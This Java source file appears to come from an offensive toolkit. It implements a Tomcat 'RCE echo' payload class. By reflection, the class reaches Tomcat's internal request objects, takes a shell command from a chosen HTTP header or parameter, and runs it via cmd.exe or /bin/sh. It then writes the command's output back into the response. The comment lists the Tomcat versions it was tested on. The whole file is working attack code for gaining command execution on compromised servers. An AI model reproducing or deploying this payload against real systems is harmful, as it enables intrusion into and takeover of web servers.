package com.ppp.middleware.rceecho;

import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.JavaClassType;
import com.ppp.annotation.Middleware;

import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * @author Whoopsunix
 * <p>
 * use https://github.com/c0ny1/java-object-searcher
 * TargetObject = {org.apache.tomcat.util.threads.TaskThread}
 * ---> group = {java.lang.ThreadGroup}
 * ---> threads = {class [Ljava.lang.Thread;}
 * ---> [13] = {java.lang.Thread}
 * ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller}
 * ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint}
 * ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler}
 * ---> global = {org.apache.coyote.RequestGroupInfo}
 * <p>
 * Version test
 * 6.0.53
 * 7.0.59、7.0.109
 * 8.0.53、8.5.82
 * 9.0.65
 */
@Middleware(Middleware.Tomcat)
@JavaClassType(JavaClassType.Default)
@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.PARAM})
public class TomcatRE {
    private static String HEADER;
    private static String PARAM;

    public TomcatRE() {
        try {
            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            Field field = threadGroup.getClass().getDeclaredField("threads");
            field.setAccessible(true);
            Thread[] threads = (Thread[]) field.get(threadGroup);

            for (int i = 0; i < threads.length; i++) {
                // Thread 筛选
                Thread thread = threads[i];
                if (thread == null)
                    continue;
                String threadName = thread.getName();
                if (!(
                        ((threadName.contains("http-nio") || threadName.contains("http-apr")) && threadName.contains("Poller"))
                                || (threadName.contains("http-bio") && threadName.contains("AsyncTimeout"))
                                || (threadName.contains("http-") && threadName.contains("Acceptor"))
                ))
                    continue;

                Object target = getFieldValue(thread, "target");
                Object this0 = getFieldValue(target, "this$0");
                Object handler = getFieldValue(this0, "handler");
                Object global = getFieldValue(handler, "global");
                java.util.List processors = (java.util.List) getFieldValue(global, "processors");

                for (int j = 0; j < processors.size(); j++) {
                    Object processor = processors.get(j);
                    Object request = getFieldValue(processor, "req");
                    Object response = invokeMethod(request.getClass(), request, "getResponse", new Class[]{}, new Object[]{});

                    Object header = invokeMethod(request.getClass(), request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
                    Object parameters = invokeMethod(request.getClass(), request, "getParameters", new Class[]{}, new Object[]{});
                    Object param = invokeMethod(parameters.getClass(), parameters, "getParameter", new Class[]{String.class}, new Object[]{PARAM});

                    String str = null;
                    if (header != null) {
                        str = (String) header;
                    } else if (param != null) {
                        str = (String) param;
                    }
                    String result = exec(str);
                    invokeMethod(response.getClass(), response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
                    try {
                        invokeMethod(response.getClass(), response, "doWrite", new Class[]{java.nio.ByteBuffer.class}, new Object[]{java.nio.ByteBuffer.wrap(result.getBytes())});
                    } catch (Exception e) {
                        Class clazz;
                        try {
                            clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
                        } catch (ClassNotFoundException e1) {
                            clazz = Thread.currentThread().getContextClassLoader().loadClass("org.apache.tomcat.util.buf.ByteChunk");
                        }
                        Object byteChunk = clazz.newInstance();
                        invokeMethod(clazz, byteChunk, "setBytes", new Class[]{byte[].class, Integer.TYPE, Integer.TYPE}, new Object[]{result.getBytes(), 0, result.getBytes().length});
                        invokeMethod(response.getClass(), response, "doWrite", new Class[]{clazz}, new Object[]{byteChunk});
                    }

                    return;
                }
            }
        } catch (Exception e) {
        }
    }

    public static String exec(String str) throws Exception {
        String[] cmd;
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            cmd = new String[]{"cmd.exe", "/c", str};
        } else {
            cmd = new String[]{"/bin/sh", "-c", str};
        }
        InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
        return exec_result(inputStream);
    }

    public static String exec_result(InputStream inputStream) throws Exception {
        byte[] bytes = new byte[1024];
        int len;
        StringBuilder stringBuilder = new StringBuilder();
        while ((len = inputStream.read(bytes)) != -1) {
            stringBuilder.append(new String(bytes, 0, len));
        }
        return stringBuilder.toString();
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method = cls.getDeclaredMethod(methodName, argsClass);
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }

}
